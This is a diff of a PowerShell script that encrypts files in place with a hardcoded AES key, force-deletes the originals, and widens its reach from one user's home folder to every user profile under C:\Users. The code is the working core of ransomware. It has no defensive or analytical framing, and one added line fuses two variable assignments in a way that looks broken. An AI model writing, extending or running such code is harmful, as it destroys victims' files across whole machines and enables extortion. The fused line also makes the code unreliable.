@@ -1,9 +1,8 @@
-# Define the AES key and IV (256-bit key, 128-bit IV, both filled with zeros for simplicity)
-$base64Key = "AatN58YdomB+dm/PhpPH37/xwPLACPe5Uux1R3hoQDA="
-$base64IV = "fokodaUsWaO1iDBrE8MfvQ=="
+$base64Key = "AatN58YdomB+dm/PhpPH37/xwPLACPe5Uux1R3hoQDA="$base64IV = "fokodaUsWaO1iDBrE8MfvQ=="
 $key = [System.Convert]::FromBase64String($base64Key)
 $iv = [System.Convert]::FromBase64String($base64IV)
 
+# Function to encrypt a single file
 function Encrypt-File {
     param (
         [string]$filePath,
@@ -11,44 +10,45 @@ function Encrypt-File {
         [byte[]]$iv
     )
 
-    # Read file content
     $content = [System.IO.File]::ReadAllBytes($filePath)
 
-    # Create AES instance
     $aes = [System.Security.Cryptography.Aes]::Create()
     $aes.Key = $key
     $aes.IV = $iv
     $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 
-    # Encrypt the content
     $encryptor = $aes.CreateEncryptor()
     $encryptedBytes = $encryptor.TransformFinalBlock($content, 0, $content.Length)
 
-    # Delete all items before rewriting
-    Remove-Item $filePath
+    Remove-Item $filePath -Force
 
-    # Write encrypted content to new file
-    $encryptedFilePath = "$filePath"
-    [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedBytes)
+    [System.IO.File]::WriteAllBytes($filePath, $encryptedBytes)
 
-    Write-Host "Encrypted: $filePath -> $encryptedFilePath"
+    Write-Host "Encrypted: $filePath"
 }
 
-# Get the current user's home directory
-$homeDirectory = [System.Environment]::GetFolderPath('UserProfile')
+$usersDirectory = "C:\Users"
+$excludedDirectories = @('Public', 'Default', 'Default User', 'All Users')
 
-# Get all files in the user's home directory and subdirectories
-$files = Get-ChildItem -Path $homeDirectory -Recurse -File
+$validUserDirectories = Get-ChildItem -Path $usersDirectory | Where-Object {
+    $_.PSIsContainer -and
+    $_.Name -notin $excludedDirectories
+}
 
-# Encrypt each file in the home directory
-foreach ($file in $files) {
-    try {
-        Encrypt-File -filePath $file.FullName -key $key -iv $iv
-    } catch {
-        Write-Host "Failed to encrypt: $($file.FullName)"
+foreach ($userDir in $validUserDirectories) {
+    Write-Host "Encrypting files in user directory: $($userDir.FullName)"
+    $files = Get-ChildItem -Path $userDir.FullName -Recurse -File
+    foreach ($file in $files) {
+        try {
+            Encrypt-File -filePath $file.FullName -key $key -iv $iv
+        } catch {
+            Write-Host "Failed to encrypt: $($file.FullName)"
+        }
     }
 }
+
+Write-Host "Encryption completed."
 
 
 # Load Windows Forms assembly
